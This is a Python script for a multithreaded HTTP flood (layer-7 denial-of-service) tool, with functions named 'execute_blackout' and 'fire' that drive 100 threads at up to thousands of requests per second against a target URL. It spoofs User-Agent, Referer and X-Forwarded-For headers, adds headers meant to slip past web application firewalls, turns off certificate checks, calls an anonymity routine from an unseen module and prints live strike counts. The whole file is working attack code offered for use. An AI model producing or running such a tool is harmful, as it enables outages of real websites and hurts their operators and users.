import threading, requests, random, time
from urllib3.exceptions import InsecureRequestWarning
from expansion_modules import load_all_expansions, run_anonymity_protocol

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

user_agents = [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(50,100)}) Gecko/20100101 Firefox/{random.randint(50,100)}"
    for _ in range(200)
]

metrics = { "sent": 0, "success": 0, "fail": 0 }
lock = threading.Lock()

def random_headers(target, use_expansion=False):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": f"https://bing.com?q={random.randint(1000,9999)}",
        "X-Forwarded-For": ".".join(str(random.randint(1,255)) for _ in range(4)),
        "Cache-Control": "no-store", "Connection": "keep-alive"
    }
    if use_expansion:
        headers = load_all_expansions(headers, target)
    return headers

def fire(target, end_time, rps, waf_bypass, expansions):
    global metrics
    while time.time() < end_time:
        for _ in range(rps):
            try:
                headers = random_headers(target, use_expansion=expansions)
                if waf_bypass:
                    headers["X-WAF-Bypass"] = "yes"
                    headers["Forwarded"] = "for=127.0.0.1;proto=https"
                r = requests.get(target, headers=headers, timeout=3, verify=False)
                with lock:
                    metrics["sent"] += 1
                    if r.status_code == 200:
                        metrics["success"] += 1
                    else:
                        metrics["fail"] += 1
            except:
                with lock:
                    metrics["sent"] += 1
                    metrics["fail"] += 1

def monitor(duration):
    start = time.time()
    while time.time() < start + duration:
        time.sleep(1)
        with lock:
            print(f"📊 SENT: {metrics['sent']} | ✅ OK: {metrics['success']} | ❌ ERR: {metrics['fail']}")

def execute_blackout(target, duration, fire_class, waf_bypass, anonymize, expansions):
    multiplier = {1:10, 2:50, 3:250, 4:1000, 5:5000}
    rate = multiplier.get(fire_class, 250)
    threads = 100
    end_time = time.time() + duration

    if anonymize:
        run_anonymity_protocol()

    print(f"🔥 STRIKE: {threads * rate}/s | MODE: {fire_class} | WAF: {waf_bypass} | EXP: {expansions}")

    pool = [threading.Thread(target=fire, args=(target, end_time, rate, waf_bypass, expansions)) for _ in range(threads)]
    for t in pool: t.start()

    mon = threading.Thread(target=monitor, args=(duration,))
    mon.start()

    for t in pool: t.join()
    mon.join()
